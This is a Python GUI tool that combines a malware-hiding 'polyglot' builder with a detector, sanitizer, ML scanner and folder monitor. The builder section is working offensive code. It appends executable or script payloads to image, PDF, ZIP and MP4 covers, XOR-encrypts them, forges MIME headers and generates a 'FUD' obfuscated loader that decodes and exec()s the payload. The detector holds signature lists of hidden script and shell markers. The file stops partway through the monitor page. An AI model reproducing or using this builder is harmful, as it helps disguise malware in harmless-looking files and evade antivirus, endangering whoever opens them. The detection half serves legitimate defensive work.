#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v3.0 — Red Team + Shield Edition           ║
║  Builder + ML Detector + YARA + Sanitizer + Monitor          ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, os, math, struct, zlib, base64, hashlib, shutil, random, time, platform, subprocess, json, logging, threading
from datetime import datetime
from pathlib import Path
from collections import deque

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QFrame, QStackedWidget, QFileDialog,
    QTextEdit, QLineEdit, QComboBox, QCheckBox, QProgressBar,
    QGroupBox, QGridLayout, QScrollArea, QSplitter, QMessageBox,
    QTabWidget, QSpinBox, QTreeWidget, QTreeWidgetItem, QHeaderView,
    QSizePolicy, QPlainTextEdit
)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal, QSize
from PyQt6.QtGui import QFont, QColor, QPalette, QIcon

import numpy as np

# ── Import engines ───────────────────────────────────────────
from engines.features import extract_features, analyze_file, get_feature_names, _shannon
from engines.model import PolyglotModel, HAS_CATBOOST
from engines.yara_engine import YaraEngine
from engines.generator import SyntheticGenerator
from engines.scanner import Scanner, ScanResult
from engines.quarantine import QuarantineManager
from engines.notifications import NotificationManager, Alert
from engines.monitor import FolderMonitor, HAS_WATCHDOG
from engines.config import Config

logger = logging.getLogger("polyglot_toolkit")

# ── Theme ────────────────────────────────────────────────────

class T:
    BG      = "#0a0e14"
    BG2     = "#111822"
    BG3     = "#1a2233"
    BG_IN   = "#0d1520"
    HOVER   = "#1e2d44"
    FG      = "#c5d0db"
    DIM     = "#556677"
    RED     = "#ff3333"
    GREEN   = "#22cc55"
    YELLOW  = "#ddaa22"
    BLUE    = "#3399ff"
    PURPLE  = "#aa55ff"
    CYAN    = "#22dddd"
    ORANGE  = "#f0883e"
    BORDER  = "#1e2d3d"

# ── Cross-platform notifications ─────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        try:
            s = platform.system()
            if s == "Linux":
                subprocess.run(["notify-send","-u",urgency,"-a","Polyglot Toolkit",title,message],
                             capture_output=True, timeout=5)
            elif s == "Darwin":
                subprocess.run(["osascript","-e",f'display notification "{message}" with title "{title}"'],
                             capture_output=True, timeout=5)
            elif s == "Windows":
                ps = f'''[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
$t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
$t.GetElementsByTagName("text")[0].AppendChild($t.CreateTextNode("{title}"))
$t.GetElementsByTagName("text")[1].AppendChild($t.CreateTextNode("{message}"))
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Polyglot").Show([Windows.UI.Notifications.ToastNotification]::new($t))'''
                subprocess.run(["powershell","-Command",ps], capture_output=True, timeout=10)
        except: pass

    @staticmethod
    def beep():
        try:
            s = platform.system()
            if s == "Linux":
                subprocess.run(["paplay","/usr/share/sounds/freedesktop/stereo/alarm-clock-elapsed.oga"],
                             capture_output=True, timeout=3)
            elif s == "Darwin":
                subprocess.run(["afplay","/System/Library/Sounds/Glass.aiff"], capture_output=True, timeout=3)
            elif s == "Windows":
                import winsound; winsound.MessageBeep(0x30)
        except: pass


# ── Styled widget helpers ────────────────────────────────────

def btn(text, color=T.RED, bg=None):
    b = QPushButton(text)
    bg = bg or color
    b.setStyleSheet(f"QPushButton{{background:{bg};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold;font-size:13px}}QPushButton:hover{{background:{color}}}QPushButton:pressed{{background:{T.BG}}}")
    b.setCursor(Qt.CursorShape.PointingHandCursor)
    return b

def card(title="", icon=""):
    f = QFrame()
    f.setStyleSheet(f"QFrame{{background:{T.BG3};border:1px solid {T.BORDER};border-radius:10px}}")
    l = QVBoxLayout(f); l.setContentsMargins(18,14,18,14)
    if title:
        lbl = QLabel(f"{icon}  {title}" if icon else title)
        lbl.setStyleSheet(f"color:{T.BLUE};font-size:14px;font-weight:bold;border:none;")
        l.addWidget(lbl)
    return f, l

def stat_card(icon, value, label, color):
    c = QFrame()
    c.setStyleSheet(f"QFrame{{background:qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 {T.BG3},stop:1 {T.BG2});border:1px solid {T.BORDER};border-radius:12px}}")
    l = QVBoxLayout(c); l.setAlignment(Qt.AlignmentFlag.AlignCenter); l.setSpacing(4)
    il = QLabel(icon); il.setStyleSheet(f"font-size:28px;border:none;"); il.setAlignment(Qt.AlignmentFlag.AlignCenter)
    vl = QLabel(str(value)); vl.setStyleSheet(f"color:{color};font-size:32px;font-weight:bold;border:none;font-family:Consolas,monospace;"); vl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    nl = QLabel(label); nl.setStyleSheet(f"color:{T.DIM};font-size:11px;border:none;letter-spacing:1px;"); nl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    l.addWidget(il); l.addWidget(vl); l.addWidget(nl)
    c._val = vl
    return c

def inp(placeholder=""):
    e = QLineEdit(); e.setPlaceholderText(placeholder)
    e.setStyleSheet(f"QLineEdit{{background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;padding:10px 14px;font-family:Consolas,monospace;font-size:13px}}QLineEdit:focus{{border:1px solid {T.RED}}}")
    return e

def combo(items):
    c = QComboBox(); c.addItems(items)
    c.setStyleSheet(f"QComboBox{{background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;padding:10px 14px;font-size:13px}}QComboBox:hover{{border:1px solid {T.RED}}}QComboBox::drop-down{{border:none;width:30px}}QComboBox QAbstractItemView{{background:{T.BG3};color:{T.FG};selection-background-color:{T.HOVER};border:1px solid {T.BORDER}}}")
    return c

def log_box():
    e = QTextEdit(); e.setReadOnly(True)
    e.setStyleSheet(f"QTextEdit{{background:{T.BG};color:{T.FG};border:1px solid {T.BORDER};border-radius:8px;padding:12px;font-family:Consolas,monospace;font-size:12px;selection-background-color:{T.RED}}}")
    return e

def append_log(widget, text, color=None):
    c = color or T.FG
    widget.append(f'<span style="color:{c}">{text}</span>')


# ── Builder Engine (from polyglot_tui.py) ────────────────────

class PolyglotBuilder:
    def entropy(self, data):
        if not data: return 0.0
        f=[0]*256
        for b in data: f[b]+=1
        l=len(data)
        return -sum((x/l)*math.log2(x/l) for x in f if x>0)

    def xor(self, data, key):
        k=(key*(len(data)//len(key)+1))[:len(data)]
        return bytes(a^b for a,b in zip(data,k))

    def fud(self, payload):
        key=os.urandom(32); enc=self.xor(payload,key); comp=zlib.compress(enc,9)
        stub=b'#!/usr/bin/env python3\nimport base64,zlib\n'
        stub+=f'k=bytes.fromhex("{key.hex()}")\n'.encode()
        stub+=b'd=base64.b85decode(b"'+base64.b85encode(comp)+b'")\n'
        stub+=b'd=bytes(a^b for a,b in zip(d,(k*(len(d)//len(k)+1))[:len(d)]))\n'
        stub+=b'exec(compile(zlib.decompress(d),"<fud>","exec"))\n'
        return stub

    def mime_confuse(self, data, ext):
        hdrs={'.jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01',
              '.png':b'\x89PNG\r\n\x1a\n','.gif':b'GIF89a\x01\x00\x01\x00',
              '.pdf':b'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n',
              '.mp4':b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00',
              '.zip':b'PK\x03\x04\x14\x00\x00\x00\x00\x00'}
        return hdrs.get(ext,b'')+data

    def build(self, cover_path, payload_path, output_path, container="jpeg",
              encrypt=False, fud=False, mime=False):
        with open(cover_path,'rb') as f: cover=f.read()
        with open(payload_path,'rb') as f: payload=f.read()
        orig=payload; key=None
        if fud: payload=self.fud(payload)
        if encrypt: key=os.urandom(32); payload=self.xor(payload,key)
        if mime: payload=self.mime_confuse(payload,os.path.splitext(cover_path)[1])
        builders={'jpeg':self._j,'jpg':self._j,'png':self._p,'gif':self._g,
                  'pdf':self._d,'zip':self._z,'mp4':self._m}
        b=builders.get(container.lower())
        if not b: raise ValueError(f"Unsupported: {container}")
        poly=b(cover,payload)
        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.',exist_ok=True)
        with open(output_path,'wb') as f: f.write(poly)
        return {'output':output_path,'container':container.upper(),'cover_size':len(cover),
                'payload_size':len(orig),'output_size':len(poly),'offset':len(poly)-len(payload),
                'encrypted':encrypt,'fud':fud,'mime':mime,'entropy':round(self.entropy(payload),2)}

    def _j(self,c,p):
        if c[:2]!=b'\xff\xd8': raise ValueError("Not JPEG")
        e=c.rfind(b'\xff\xd9')
        if e==-1: raise ValueError("No EOI")
        return c[:e+2]+b'\xff\xfe'+struct.pack('<H',min(len(p),65533))+p

    def _p(self,c,p):
        if c[:8]!=b'\x89PNG\r\n\x1a\n': raise ValueError("Not PNG")
        e=c.rfind(b'IEND')
        if e==-1: raise ValueError("No IEND")
        return c[:e+8]+p

    def _g(self,c,p):
        if c[:6] not in (b'GIF87a',b'GIF89a'): raise ValueError("Not GIF")
        e=c.rfind(b'\x3b')
        if e==-1: raise ValueError("No terminator")
        return c[:e+1]+b'\x00'*16+p

    def _d(self,c,p):
        if not c.startswith(b'%PDF'): raise ValueError("Not PDF")
        e=c.rfind(b'%%EOF')
        if e==-1: raise ValueError("No EOF")
        return c[:e+5]+b'\r\n'+p

    def _z(self,c,p):
        if c[:2]!=b'PK': raise ValueError("Not ZIP")
        e=c.rfind(b'\x50\x4b\x05\x06')
        if e==-1: raise ValueError("No EOCD")
        return c[:e]+p+c[e:]

    def _m(self,c,p):
        if b'ftyp' not in c[:20]: raise ValueError("Not MP4")
        return c+struct.pack('>I',len(p)+8)+b'free'+p


# ── Detector Engine ──────────────────────────────────────────

class PolyglotDetector:
    SIGS={'PE/EXE':b'MZ','ELF':b'\x7fELF','PDF':b'%PDF','ZIP':b'PK',
          'RAR':b'Rar!','7Z':b'7z','GZIP':b'\x1f\x8b','BAT':b'@echo',
          'PS1':b'powershell','SH':b'#!/bin/','CLASS':b'\xca\xfe\xba\xbe',
          'MACHO':b'\xfe\xed\xfa','LNK':b'\x4c\x00\x00\x00','VBS':b'CreateObject',
          'HTA':b'<hta:','SCRIPT':b'<script','CMD':b'cmd.exe',
          'PYTHON':b'#!/usr/bin/env python','APPLESCRIPT':b'osascript',
          'WSF':b'<job','HTA2':b'<HTA:'}

    def scan_file(self, fp):
        findings=[]
        try:
            with open(fp,'rb') as f: data=f.read()
        except Exception as e: return [{'type':'ERROR','detail':str(e),'severity':'error','offset':0}]
        ext=os.path.splitext(fp)[1].lower()
        ct=None
        if data[:2]==b'\xff\xd8': ct='JPEG'
        elif data[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif data[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif data[:4]==b'%PDF': ct='PDF'
        elif data[:2]==b'PK': ct='ZIP'
        elif b'ftyp' in data[:20]: ct='MP4'
        elif data[:2]==b'MZ': ct='PE'
        elif data[:4]==b'\x7fELF': ct='ELF'
        exp={'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
             '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4'}.get(ext)
        if exp and ct and exp!=ct:
            findings.append({'type':'EXT_MISMATCH','detail':f'Ext={exp}, Content={ct}','severity':'critical','offset':0})
        for nm,sig in self.SIGS.items():
            off=data.find(sig,64)
            if off!=-1:
                findings.append({'type':'HIDDEN_SIG','detail':f'{nm} @ 0x{off:X}',
                    'severity':'critical' if nm in ('PE/EXE','ELF','LNK',
                    'SCRIPT','HTA','HTA2','VBS','PYTHON','APPLESCRIPT','WSF') else 'warning','offset':off})
        mkrs={'JPEG':(b'\xff\xd9',2),'PNG':(b'IEND',8),'GIF':(b'\x3b',1),'PDF':(b'%%EOF',5)}
        if ct in mkrs:
            m,ex=mkrs[ct]; pos=data.rfind(m)
            if pos!=-1 and pos+ex<len(data):
                findings.append({'type':'TRAILING','detail':f'{len(data)-pos-ex:,} bytes after {ct} end','severity':'critical','offset':pos+ex})
        ss=max(len(data)//8,1)
        for i in range(8):
            s=data[i*ss:(i+1)*ss]
            if len(s)>=100:
                a=np.frombuffer(s,dtype=np.uint8); c=np.bincount(a,minlength=256).astype(np.float64)
                p=c/c.sum(); p=p[p>0]; ent=float(-np.sum(p*np.log2(p)))
                if ent>7.5: findings.append({'type':'HIGH_ENT','detail':f'Sec {i+1}/8: {ent:.2f}','severity':'info','offset':i*ss})
        if data[:4]==b'%PDF' and data.find(b'MZ',100)!=-1:
            findings.append({'type':'MIME_CONF','detail':'PDF+PE','severity':'critical','offset':data.find(b'MZ',100)})
        return findings


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    def sanitize(self, fp, backup=True):
        with open(fp,'rb') as f: data=f.read()
        orig=len(data); ext=os.path.splitext(fp)[1].lower()
        cleaned=None; det=None
        hdrs={('.jpg','.jpeg'):('JPEG',b'\xff\xd9',2),('.png',):('PNG',b'IEND',8),
              ('.gif',):('GIF',b'\x3b',1),('.pdf',):('PDF',b'%%EOF',5)}
        for exts,(nm,m,ex) in hdrs.items():
            if ext in exts or data[:2]==m[:2]:
                pos=data.rfind(m)
                if pos!=-1 and pos+ex<len(data): cleaned=data[:pos+ex]; det=nm
                break
        if ext=='.zip' or data[:2]==b'PK':
            eocd=data.rfind(b'\x50\x4b\x05\x06')
            if eocd!=-1 and eocd+22<len(data): cleaned=data[:eocd+22]; det='ZIP'
        if cleaned is None or len(cleaned)>=orig:
            return {'status':'clean','detail':f'{det or "?"}: clean','removed':0}
        if backup: shutil.copy2(fp,fp+'.bak')
        with open(fp,'wb') as f: f.write(cleaned)
        return {'status':'sanitized','detail':f'{det}: {orig-len(cleaned):,} bytes removed',
                'removed':orig-len(cleaned),'backup':fp+'.bak' if backup else None}


# ═════════════════════════════════════════════════════════════
# WORKER THREADS
# ═════════════════════════════════════════════════════════════

class ScanWorker(QThread):
    result = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    done = pyqtSignal(dict)

    def __init__(self, files, use_ml=False, model=None):
        super().__init__()
        self.files = files
        self.use_ml = use_ml
        self.model = model
        self.detector = PolyglotDetector()
        self.yara = YaraEngine()

    def run(self):
        results = []
        threats = 0
        threat_files = []  # Track files with threats for quarantine
        for i, fpath in enumerate(self.files):
            self.progress.emit(i+1, len(self.files))
            try:
                if self.use_ml and self.model and self.model.is_loaded:
                    feats = extract_features_from_file(fpath)
                    pred = self.model.predict_single(feats)
                    yara_matches, _ = self.yara.scan_file(fpath)
                    findings = self.detector.scan_file(fpath)
                    r = {
                        'file': os.path.basename(fpath), 'path': fpath,
                        'ml_label': pred['label'], 'ml_risk': pred['risk_score'],
                        'ml_conf': pred['confidence'], 'ml_level': pred['risk_level'],
                        'yara_count': len(yara_matches),
                        'yara_rules': [m.rule_name for m in yara_matches],
                        'findings': len(findings),
                        'severity': 'critical' if pred['risk_score']>=80 else 'high' if pred['risk_score']>=60 else 'warning' if pred['risk_score']>=40 else 'clean',
                    }
                    if pred['risk_score'] >= 50:
                        threats += 1
                        threat_files.append((fpath, findings))
                else:
                    findings = self.detector.scan_file(fpath)
                    crit = [f for f in findings if f['severity'] in ('critical','high')]
                    r = {
                        'file': os.path.basename(fpath), 'path': fpath,
                        'findings': len(findings), 'critical': len(crit),
                        'details': findings,
                        'severity': 'critical' if crit else 'warning' if findings else 'clean',
                    }
                    if crit:
                        threats += 1
                        threat_files.append((fpath, findings))
                results.append(r)
                self.result.emit(r)
            except Exception as e:
                results.append({'file': os.path.basename(fpath), 'error': str(e), 'severity': 'error'})
        self.done.emit({'total': len(self.files), 'threats': threats, 'results': results, 'threat_files': threat_files})


class TrainWorker(QThread):
    log = pyqtSignal(str)
    done = pyqtSignal(dict)

    def __init__(self, n_samples=1000, task_type="GPU"):
        super().__init__()
        self.n_samples = n_samples
        self.task_type = task_type

    def run(self):
        try:
            self.log.emit(f"Generating {self.n_samples} synthetic samples...")
            gen = SyntheticGenerator(output_dir="samples")
            samples = gen.generate_all(self.n_samples)
            self.log.emit(f"Generated {len(samples)} samples")

            self.log.emit("Extracting features...")
            X, y = [], []
            for fpath, label in samples:
                try:
                    feats = extract_features_from_file(fpath)
                    X.append(feats)
                    y.append(label)
                except: pass
            X = np.array(X); y = np.array(y)
            self.log.emit(f"Features: {X.shape[0]} samples × {X.shape[1]} features")

            split = int(0.8 * len(X))
            X_train, X_eval = X[:split], X[split:]
            y_train, y_eval = y[:split], y[split:]

            model = PolyglotModel({'task_type': self.task_type})
            self.log.emit(f"Training CatBoost ({self.task_type})...")
            meta = model.train(X_train, y_train, X_eval, y_eval)
            model.save("models/polyglot_shield.cbm")
            self.log.emit(f"Model saved. Best iter: {meta.get('best_iteration', '?')}")

            imp = model.get_feature_importance(10)
            self.log.emit("Top features:")
            for name, score in imp:
                self.log.emit(f"  {name}: {score:.4f}")

            self.done.emit(meta)
        except Exception as e:
            self.log.emit(f"ERROR: {e}")
            self.done.emit({'error': str(e)})

from engines.features import extract_features_from_file


class MonitorWorker(QThread):
    alert = pyqtSignal(dict)
    stats = pyqtSignal(dict)

    def __init__(self):
        super().__init__()
        self.running = False
        self.watch_dir = None
        self.file_hashes = {}
        self.detector = PolyglotDetector()
        self._stats = {'scanned': 0, 'threats': 0, 'clean': 0}

    def start_watch(self, directory):
        self.watch_dir = directory
        self.running = True
        self.start()

    def stop_watch(self):
        self.running = False

    def run(self):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                '.zip','.exe','.dll','.scr','.bat','.cmd','.ps1','.vbs',
                '.js','.hta','.lnk','.elf','.so','.mp4'}
        while self.running:
            try:
                for root, dirs, files in os.walk(self.watch_dir):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        if not self.running: return
                        if os.path.splitext(fname)[1].lower() not in exts: continue
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath); cur = (st.st_mtime, st.st_size)
                        except: continue
                        prev = self.file_hashes.get(fpath)
                        if prev is None or prev != cur:
                            self.file_hashes[fpath] = cur
                            self._scan(fpath)
                time.sleep(2)
            except: time.sleep(5)

    def _scan(self, fp):
        findings = self.detector.scan_file(fp)
        self._stats['scanned'] += 1
        crit = [f for f in findings if f['severity'] in ('critical','high')]
        if crit:
            self._stats['threats'] += 1
            alert = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'file': os.path.basename(fp), 'path': fp,
                'severity': 'critical' if any(f['severity']=='critical' for f in crit) else 'high',
                'detail': '; '.join(f['detail'] for f in crit[:3]),
                'findings': findings,  # Pass findings for quarantine
            }
            self.alert_signal(alert)
            Notifier.send(f"THREAT: {os.path.basename(fp)}", alert['detail'][:200], "critical")
        else:
            self._stats['clean'] += 1
        self.stats.emit(self._stats.copy())

    def alert_signal(self, a):
        self.alert.emit(a)


# ═════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═════════════════════════════════════════════════════════════

class PolyglotApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("◆ Polyglot Toolkit v3.0 — Red Team + Shield Edition")
        self.setMinimumSize(1280, 800)
        self.resize(1400, 900)

        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.config = Config.load(str(Path(__file__).parent / "config.yaml"))

        self.model = PolyglotModel(self.config.model)
        model_path = "models/polyglot_shield.cbm"
        if Path(model_path).exists():
            try: self.model.load(model_path)
            except: pass

        self.scan_worker = None
        self.train_worker = None
        self.mon_worker = None

        self.counts = {'scanned':0,'threats':0,'sanitized':0,'built':0}

        # Init quarantine manager early (before UI build)
        self.q_manager = QuarantineManager(
            quarantine_dir=self.config.quarantine.get("dir","quarantine"),
            encrypt_names=self.config.quarantine.get("encrypt_names",True),
            max_size_mb=self.config.quarantine.get("max_size_mb",500),
            retain_days=self.config.quarantine.get("retain_days",30))

        self._apply_theme()
        self._build_ui()

    def _apply_theme(self):
        self.setStyleSheet(f"""
            QMainWindow{{background:{T.BG}}}QWidget{{background:{T.BG};color:{T.FG};font-family:'Segoe UI','SF Pro',sans-serif}}
            QScrollBar:vertical{{background:{T.BG2};width:10px;border-radius:5px}}QScrollBar::handle:vertical{{background:{T.BORDER};border-radius:5px;min-height:30px}}QScrollBar::handle:vertical:hover{{background:{T.DIM}}}QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0}}
            QCheckBox{{spacing:8px;font-size:13px}}QCheckBox::indicator{{width:18px;height:18px;border:2px solid {T.BORDER};border-radius:4px;background:{T.BG_IN}}}QCheckBox::indicator:checked{{background:{T.RED};border:2px solid {T.RED}}}
            QProgressBar{{background:{T.BG2};border:none;border-radius:4px;height:8px}}QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {T.RED},stop:1 {T.ORANGE});border-radius:4px}}
            QTreeWidget{{background:{T.BG};color:{T.FG};border:1px solid {T.BORDER};border-radius:8px;font-family:Consolas,monospace;font-size:12px}}QTreeWidget::item{{padding:4px}}QTreeWidget::item:selected{{background:{T.HOVER}}}QHeaderView::section{{background:{T.BG2};color:{T.FG};border:none;padding:8px;font-weight:bold}}
        """)

    def _build_ui(self):
        central = QWidget(); self.setCentralWidget(central)
        ml = QHBoxLayout(central); ml.setContentsMargins(0,0,0,0); ml.setSpacing(0)

        # Sidebar
        sb = QFrame(); sb.setFixedWidth(220)
        sb.setStyleSheet(f"QFrame{{background:{T.BG2};border-right:1px solid {T.BORDER}}}")
        sl = QVBoxLayout(sb); sl.setContentsMargins(0,0,0,0); sl.setSpacing(0)

        logo = QFrame(); logo.setStyleSheet(f"background:{T.BG};border:none;padding:20px;")
        ll = QVBoxLayout(logo)
        l1 = QLabel("◆ POLYGLOT"); l1.setStyleSheet(f"color:{T.RED};font-size:20px;font-weight:bold;font-family:Consolas,monospace;border:none;"); l1.setAlignment(Qt.AlignmentFlag.AlignCenter)
        l2 = QLabel("RED TEAM + SHIELD"); l2.setStyleSheet(f"color:{T.DIM};font-size:9px;letter-spacing:2px;border:none;"); l2.setAlignment(Qt.AlignmentFlag.AlignCenter)
        ll.addWidget(l1); ll.addWidget(l2); sl.addWidget(logo)

        sep = QFrame(); sep.setFixedHeight(1); sep.setStyleSheet(f"background:{T.BORDER};"); sl.addWidget(sep)

        self.nav = []
        items = [("◈","Dashboard",0),("◆","Builder",1),("⚠","Scanner",2),("▶","Monitor",3),
                 ("🧠","ML Training",4),("🛡","Quarantine",5),("📋","YARA Rules",6),("📜","Logs",7),("⚙","Settings",8)]
        for icon,label,idx in items:
            b = QPushButton(f"  {icon}   {label}"); b.setCursor(Qt.CursorShape.PointingHandCursor)
            b.setStyleSheet(self._nav_s(False)); b.clicked.connect(lambda checked,i=idx,b=b:self._switch(i,b))
            sl.addWidget(b); self.nav.append(b)
        sl.addStretch()
        v = QLabel("  v3.0 — Mr-DS-ML-85"); v.setStyleSheet(f"color:{T.DIM};font-size:10px;padding:10px;border:none;"); sl.addWidget(v)
        ml.addWidget(sb)

        # Stack
        self.stack = QStackedWidget()
        self.stack.addWidget(self._pg_dashboard())
        self.stack.addWidget(self._pg_builder())
        self.stack.addWidget(self._pg_scanner())
        self.stack.addWidget(self._pg_monitor())
        self.stack.addWidget(self._pg_training())
        self.stack.addWidget(self._pg_quarantine())
        self.stack.addWidget(self._pg_yara())
        self.stack.addWidget(self._pg_logs())
        self.stack.addWidget(self._pg_settings())
        ml.addWidget(self.stack)
        self._switch(0, self.nav[0])

    def _nav_s(self, active):
        if active:
            return f"QPushButton{{background:{T.BG3};color:{T.RED};border:none;border-left:3px solid {T.RED};padding:14px 20px;text-align:left;font-size:14px;font-weight:bold}}"
        return f"QPushButton{{background:transparent;color:{T.DIM};border:none;border-left:3px solid transparent;padding:14px 20px;text-align:left;font-size:14px}}QPushButton:hover{{background:{T.BG3};color:{T.FG}}}"

    def _switch(self, idx, btn):
        self.stack.setCurrentIndex(idx)
        for b in self.nav: b.setStyleSheet(self._nav_s(False))
        btn.setStyleSheet(self._nav_s(True))

    # ── Dashboard ────────────────────────────────────────────

    def _pg_dashboard(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(20)
        h = QLabel("Dashboard"); h.setStyleSheet(f"font-size:28px;font-weight:bold;"); l.addWidget(h)

        sr = QHBoxLayout(); sr.setSpacing(15)
        self.d_scanned = stat_card("🔍","0","Files Scanned",T.BLUE)
        self.d_threats = stat_card("⚠","0","Threats Found",T.RED)
        self.d_sanitized = stat_card("🛡","0","Files Sanitized",T.GREEN)
        self.d_built = stat_card("◆","0","Polyglots Built",T.ORANGE)
        for c in [self.d_scanned,self.d_threats,self.d_sanitized,self.d_built]: sr.addWidget(c)
        l.addLayout(sr)

        bl = QHBoxLayout(); bl.setSpacing(15)
        ac, al = card("Recent Alerts","🔔"); self.d_alerts = log_box(); self.d_alerts.setMaximumHeight(300); al.addWidget(self.d_alerts); bl.addWidget(ac,2)

        qc, ql = card("Quick Actions","⚡"); ql.addSpacing(10)
        for text,cb in [("⚡ Quick Scan",self._quick_scan),("🛡 Quick Sanitize",self._quick_sanitize),
                        ("◆ Build Polyglot",lambda:self._switch(1,self.nav[1])),("▶ Start Monitor",lambda:self._switch(3,self.nav[3])),
                        ("🧠 Train Model",lambda:self._switch(4,self.nav[4]))]:
            b = btn(text, T.RED if "Scan" in text else T.GREEN if "San" in text else T.BLUE)
            b.clicked.connect(cb); ql.addWidget(b)
        ql.addStretch(); bl.addWidget(qc,1)
        l.addLayout(bl)
        return p

    # ── Builder ──────────────────────────────────────────────

    def _pg_builder(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("◆ Polyglot Builder", T.RED))

        ic, il = card("Input Files","📁")
        r = QHBoxLayout(); r.addWidget(QLabel("Cover:")); self.b_cover = inp("JPEG/PNG/GIF/PDF/ZIP/MP4..."); r.addWidget(self.b_cover,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse(self.b_cover)); r.addWidget(b); il.addLayout(r)
        r = QHBoxLayout(); r.addWidget(QLabel("Payload:")); self.b_payload = inp("EXE/BAT/VBS/script..."); r.addWidget(self.b_payload,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse(self.b_payload)); r.addWidget(b); il.addLayout(r)
        l.addWidget(ic)

        oc, ol = card("Attack Options","⚙")
        g = QGridLayout(); g.setSpacing(12)
        g.addWidget(QLabel("Container:"),0,0); self.b_type = combo(['JPEG','PNG','GIF','PDF','ZIP','MP4']); g.addWidget(self.b_type,0,1)
        g.addWidget(QLabel("Vector:"),0,2); self.b_vector = combo(['Standard Polyglot','FUD Cryptor','MIME Confusion','Covert Embedding']); g.addWidget(self.b_vector,0,3)
        h = QHBoxLayout(); self.b_enc = QCheckBox("XOR Encrypt"); self.b_fud = QCheckBox("FUD Obfuscation"); self.b_mime = QCheckBox("MIME Confusion")
        h.addWidget(self.b_enc); h.addWidget(self.b_fud); h.addWidget(self.b_mime); h.addStretch(); g.addLayout(h,1,0,1,4)
        ol.addLayout(g); l.addWidget(oc)

        bb = btn("◆ BUILD POLYGLOT", T.RED); bb.setFixedHeight(48); bb.clicked.connect(self._run_builder)
        br = QHBoxLayout(); br.addWidget(bb); br.addStretch(); l.addLayout(br)

        lc, ll = card("Build Log","📋"); self.b_log = log_box(); ll.addWidget(self.b_log); l.addWidget(lc,1)
        return p

    # ── Scanner ──────────────────────────────────────────────

    def _pg_scanner(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("⚠ Polyglot Scanner (ML + YARA + Signature)", T.YELLOW))

        ic, il = card("Scan Target","🔍")
        r = QHBoxLayout(); self.s_path = inp("File or directory..."); r.addWidget(self.s_path,1)
        for text,cb in [("File",lambda:self._browse(self.s_path)),("Dir",lambda:self._browse_dir(self.s_path)),
                         ("⚠ SCAN",self._run_scanner)]:
            b=btn(text,T.RED if "SCAN" in text else T.DIM); b.clicked.connect(cb); r.addWidget(b)
        self.s_use_ml = QCheckBox("Use ML Model"); self.s_use_ml.setChecked(self.model.is_loaded)
        r.addWidget(self.s_use_ml); il.addLayout(r)
        l.addWidget(ic)

        self.s_progress = QProgressBar(); l.addWidget(self.s_progress)

        rc, rl = card("Scan Results","📊")
        self.s_tree = QTreeWidget()
        self.s_tree.setHeaderLabels(["File","Severity","ML Label","Risk","Confidence","YARA","Findings","Details"])
        self.s_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.s_tree.setStyleSheet(f"QTreeWidget{{background:{T.BG};border:1px solid {T.BORDER};border-radius:8px}}")
        rl.addWidget(self.s_tree)
        l.addWidget(rc,1)
        return p

    # ── Monitor ──────────────────────────────────────────────

    def _pg_monitor(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("▶ Real-Time Monitor", T.CYAN))

        cc, cl = card("Watch Directory","👁")
        r = QHBoxLayout(); self.m_dir = inp(str(Path.home()/"Downloads")); r.addWidget(self.m_dir,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse_dir(self.m_dir)); r.addWidget(b)
        self.m_btn = btn("▶ START", T.GREEN); self.m_btn.clicked.connect(self._toggle_monitor); r.addWidget(self.m_btn)
